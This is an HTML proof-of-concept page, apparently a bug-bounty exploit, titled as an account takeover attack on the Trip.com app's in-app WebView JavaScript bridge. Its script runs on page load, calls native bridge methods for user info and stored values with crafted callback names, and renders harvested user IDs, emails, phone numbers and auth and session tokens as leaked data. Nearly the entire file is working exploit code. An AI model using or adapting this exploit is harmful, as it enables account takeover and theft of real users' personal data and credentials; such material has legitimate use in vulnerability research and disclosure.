<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trip.com - CRITICAL POC v9 (H5URLCommand Exact)</title>
    <style>
        :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#c9d1d9; --red:#f85149; --green:#3fb950; }
        body { font-family:-apple-system,system-ui,sans-serif; background:var(--bg); color:var(--text); margin:0; padding:20px; }
        h1 { color:var(--red); text-align:center; font-size:28px; }
        .subtitle { text-align:center; color:#8b949e; margin:10px 0 30px; }
        .container { max-width:1200px; margin:auto; display:flex; flex-direction:column; gap:20px; }
        .card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:20px; }
        .card-header { display:flex; justify-content:space-between; font-weight:600; border-bottom:1px solid var(--border); padding-bottom:12px; }
        .status { padding:4px 12px; border-radius:20px; font-size:12px; font-weight:bold; }
        .success { background:var(--green); color:#000; }
        .data-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(300px,1fr)); gap:12px; }
        .data-item { background:#000; border:1px solid var(--border); border-left:5px solid var(--red); padding:12px; border-radius:6px; }
        .console { background:#010409; padding:12px; font-family:monospace; font-size:12px; max-height:420px; overflow-y:auto; border:1px solid var(--border); border-radius:6px; }
    </style>
</head>
<body>
    <h1>TRIP.COM - CRITICAL ACCOUNT TAKEOVER POC v9</h1>
    <p class="subtitle">H5URLCommand Exact Format + Full Callback (This MUST work)</p>

    <div class="container">
        <div class="card">
            <div class="card-header">Leaked Sensitive Data (PII + Tokens) <span id="data-status" class="status">Waiting for callback...</span></div>
            <div class="data-grid" id="data"></div>
        </div>

        <div class="card">
            <div class="card-header">Live Execution Log</div>
            <div class="console" id="console"></div>
        </div>
    </div>

    <script>
        const consoleEl = document.getElementById("console");
        const dataEl = document.getElementById("data");

        function log(msg, type="info") {
            const div = document.createElement("div");
            const color = type==="success"?"#3fb950":type==="error"?"#f85149":"#c9d1d9";
            div.innerHTML = `[${new Date().toISOString().slice(11,19)}] <span style="color:${color}">${msg}</span>`;
            consoleEl.appendChild(div);
            consoleEl.scrollTop = consoleEl.scrollHeight;
        }

        function render(label, value) {
            const div = document.createElement("div");
            div.className = "data-item";
            const val = typeof value === "object" ? JSON.stringify(value,null,2) : value;
            div.innerHTML = `<div style="font-size:11px;color:#8b949e">${label}</div><div style="font-family:monospace;color:#fff">${val}</div>`;
            dataEl.appendChild(div);
            document.getElementById("data-status").innerText = "REAL DATA LEAKED!";
            document.getElementById("data-status").classList.add("success");
        }

        // ── Exact H5URLCommand callback handler ──
        window.__bridge_callback = function(base64) {
            try {
                const json = JSON.parse(atob(base64));
                log(`✅ REAL CALLBACK → tag: ${json.tagname}`, "success");
                const data = json.param || json.value || json;
                if (data.UserID || data.Token) {
                    render("UserID", data.UserID);
                    render("Email", data.Email);
                    render("Mobile", data.Mobile);
                    render("Auth Token", data.Auth);
                    render("Session Token", data.Token);
                    render("SAuth", data.SAuth);
                }
            } catch(e) {}
        };

        // Direct callback (H5URLCommand calls window[callback_tagname])
        function createExactCallback(name) {
            window[name] = function(result) {
                log(`Direct callback ${name} fired`, "success");
                if (result && result.UserID) {
                    render("UserID (direct)", result.UserID);
                    render("Token (direct)", result.Token);
                }
            };
            return name;
        }

        async function exploit() {
            log("=== v9 EXACT H5URLCommand FORMAT STARTED ===", "success");

            const cbName = "exactCb_" + Date.now();
            createExactCallback(cbName);

            // User_a.getUserInfo - دقیقاً همونی که H5URLCommand قبول می‌کنه
            if (window.User_a) {
                const exactJson = JSON.stringify({ callback_tagname: cbName });
                try {
                    window.User_a.getUserInfo(exactJson);
                    log(`User_a.getUserInfo sent with exact: ${exactJson}`, "info");
                } catch(e) {}
            }

            // IBUStorageV2_a.IBUGetUserValue
            if (window.IBUStorageV2_a) {
                const keys = ["userInfo", "token", "uid", "vtoken"];
                keys.forEach(key => {
                    const cb = createExactCallback("store_" + key + "_" + Date.now());
                    const param = JSON.stringify({
                        callback_tagname: cb,
                        bussiness: key === "userInfo" ? "user" : "common",
                        key: key
                    });
                    try {
                        window.IBUStorageV2_a.IBUGetUserValue(param);
                        log(`IBUGetUserValue ${key} sent`, "info");
                    } catch(e) {}
                });
            }

            log("All methods called with exact callback_tagname format.", "success");
        }

        window.onload = () => {
            log("Starting exact H5URLCommand test...");
            setTimeout(exploit, 800);
        };
    </script>
</body>
</html>
